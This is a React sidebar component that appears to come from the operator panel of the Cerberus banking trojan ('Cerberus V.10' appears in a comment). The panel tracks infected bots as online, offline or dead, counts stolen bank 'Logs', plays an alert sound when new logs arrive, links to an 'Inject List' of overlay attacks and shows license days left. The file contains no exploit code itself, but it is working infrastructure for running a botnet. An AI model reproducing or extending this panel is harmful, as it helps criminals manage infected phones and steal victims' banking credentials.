import React from "react";
import { NavLink } from "react-router-dom";
import SettingsContext from "../Settings";
import { try_eval } from "../serviceF";
import $ from "jquery";
import { isNullOrUndefined } from "util";

function createCookie(name, value, days) {
  var expires = "";
  if (days) {
    var date = new Date();
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
    expires = "; expires=" + date.toGMTString();
  }
  document.cookie = name + "=" + value + expires + "; path=/";
}

class SideBarMenu extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      error: null,
      isLoaded: false,
      stats_banks: -1,
      stats_bots: "0",
      stats_cards: "0",
      stats_dead: "0",
      stats_mails: "0",
      stats_offline: "0",
      stats_online: "0",
    };
    this.audio = new Audio("/sound.ogg");
    this.onLoadJson = this.onLoadJson.bind(this);
  }

  componentDidMount() {
    this.onLoadJson();
  }

  autoUpdate() {
    if (SettingsContext.autoUpdateEnable)
      this._timer = setInterval(
        () => this.onLoadJson(),
        SettingsContext.autoUpdateDelay
      );
  }

  componentWillReceiveProps(newProps) {
    this.onLoadJson();
  }

  componentWillUnmount() {
    this.DisableTimer();
  }

  componentWillUpdate(nextProps, nextState) {
      //console.log(nextState, this.state, nextProps, this.props, '------');
      if (this.state.stats_banks !== -1 && nextState.stats_banks > this.state.stats_banks) {
         //console.log('----audio notify----');
          this.audio.play();
      }
  }

  DisableTimer() {
    if (this._timer) {
      clearInterval(this._timer);
      this._timer = null;
    }
  }

  async onLoadJson() {
    this.DisableTimer();
    while (isNullOrUndefined(SettingsContext.restApiUrl))
      await SettingsContext.sleep(500);
    while (SettingsContext.restApiUrl.length < 15)
      await SettingsContext.sleep(500);

    let request = $.ajax({
      type: "POST",
      url: SettingsContext.restApiUrl,
      data: {
        params: new Buffer('{"request":"mainStats"}').toString("base64"),
      },
    });

    request.done(
      function (msg) {
        try {
          let result = JSON.parse(msg);
          if (!isNullOrUndefined(result.error)) {
            SettingsContext.ShowToastTitle("error", "ERROR", result.error);
          } else {
            this.setState({
              isLoaded: true,
              stats_banks: result.banks,
              stats_bots: result.bots,
              stats_dead: result.dead,
              stats_offline: result.offline,
              stats_online: result.online,
            });
          }
        } catch (ErrMgs) {
          SettingsContext.ShowToastTitle(
            "error",
            "ERROR",
            "Error loading main stats. Look console for more details."
          );
          console.log("Error - " + ErrMgs);
        }
      }.bind(this)
    );

    this.autoUpdate();
  }

  defaultOnClickAction() {
    this.onLoadJson();
    try_eval(
      'document.getElementById("sidebar").style.display = "";document.getElementById("blackbox").style.display = "";'
    );
  }

  logOutEvent() {
    var cookies = document.cookie.split(";");
    for (var i = 0; i < cookies.length; i++) {
      createCookie(cookies[i].split("=")[0], "", -1);
    }
    document.location = "/?logout";
  }

  render() {
    return (
      <React.Fragment>
        {/** Наши линки на страницы роутера */}
        <div class="navLink disable-select d-flex justify-content-between">
          <div className="col-md-3 d-none d-md-block d-lg-block">
            <div className="row align-items-center justify-content-center">
              <NavLink
                onClick={this.defaultOnClickAction.bind(this)}
                activeClassName="selected"
                to="/"
              >
                <img class="logo" src="/img/5.png" alt="" />
              </NavLink>
              {/* <h1 className="logo-title mb-0">Cerberus<br />V.10</h1> */}
            </div>
          </div>
          <div className="main-menu col-md-6 col-12 d-flex justify-content-between flex-column">
            <div className="menu-items d-flex justify-content-between w-100">
              <div class="NavItem">
                <NavLink
                  onClick={this.defaultOnClickAction.bind(this)}
                  activeClassName="selected"
                  to="/main"
                >
                  <i class="fas fa-laptop-code mx-auto d-block nav-img"></i>
                  Homepage
                </NavLink>
              </div>
              <div class="NavItem">
                <NavLink
                  onClick={this.defaultOnClickAction.bind(this)}
                  activeClassName="selected"
                  to="/bots"
                >
                  <i class="fas fa-robot mx-auto d-block nav-img"></i>
                  Bots
                </NavLink>
              </div>
              <div class="NavItem">
                <NavLink
                  onClick={this.defaultOnClickAction.bind(this)}
                  activeClassName="selected"
                  to="/bank"
                >
                  <i class="far fa-money-bill-alt mx-auto d-block nav-img"></i>
                  <span>Logs <span className="badge badge-info">{this.state.stats_banks > 0 ? this.state.stats_banks : ""}</span></span>
                </NavLink>
              </div>
              <div class="NavItem">
                <NavLink
                  onClick={this.defaultOnClickAction.bind(this)}
                  activeClassName="selected"
                  to="/inj"
                >
                  <i class="fas fa-bug mx-auto d-block nav-img"></i>
                  Inject List
                </NavLink>
              </div>
              <div class="NavItem">
                <NavLink
                  onClick={this.defaultOnClickAction.bind(this)}
                  activeClassName="selected"
                  to="/settings"
                >
                  <i class="fas fa-cogs mx-auto d-block nav-img"></i>
                  Settings
                </NavLink>
              </div>
            </div>
            <div className="bot-items d-flex justify-content-center w-100 mt-3">
              <div class="ministats">
                <p class="disable-select text-center">
                  <span class="debug">Bots: {this.state.stats_bots}</span>
                  <span class="info has-layout">Online: {this.state.stats_online}</span>
                  <span class="warn">Offline: {this.state.stats_offline}</span>
                </p>
                <p class="disable-select text-center mt-2">
                  <span class="error">Dead: {this.state.stats_dead}</span> |{" "}
                  <span class="warna">Logs: {this.state.stats_banks}</span>
                </p>
              </div>
              {/* <div class="ministats" style={{marginTop: "25px"}}>
                <p
                  class="disable-select text-right"
                  style={{ marginTop: "-5px" }}
                >
                  Panel {SettingsContext.panelVersion}
                </p>
              </div> */}
            </div>
          </div>
          <div className="col-md-3 d-none d-md-block d-lg-block text-right pr-5">
            <div className="row align-items-center justify-content-end">
              <div className="d-flex flex-column">
                <div className="language d-flex justify-content-end mt-3">
                  <img class="flag mr-1 " src="img/flag/tr.png" alt="" />
                  <img class="flag" src="img/flag/us.png" alt="" />
                </div>
                <i
                  class="fas fa-sign-out-alt logout"
                  onClick={this.logOutEvent.bind(this)}
                  title="Log out"
                ></i>
                <div class="ministats mt-4">
                  <p
                    class="disable-select text-right info px-0"
                    style={{ marginTop: "-5px" }}
                  >
                    License days left{" "}
                    <span class="warn">{SettingsContext.licensedays}</span>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
        {/* <hr style={({marginBottom: '0px'})} /> */}
        {/* <div class="ministats">
          <p class="disable-select text-center">
          <span class="debug">Bots: {this.state.stats_bots}</span> | <span class="info">Online: {this.state.stats_online}</span> | <span class="warn">Offline: {this.state.stats_offline}</span></p>
          <p class="disable-select text-center">
          <span class="error">Dead: {this.state.stats_dead}</span> | <span class="warna">Logs: {this.state.stats_banks}</span></p>
          <p class="disable-select text-right" style={({marginTop:"-5px"})}>Panel {SettingsContext.panelVersion}</p>
          <p class="disable-select text-right info" style={({marginTop:"-5px"})}>License days left <span class="warn">{SettingsContext.licensedays}</span></p>
        </div> */}
      </React.Fragment>
    );
  }
}

export default SideBarMenu;
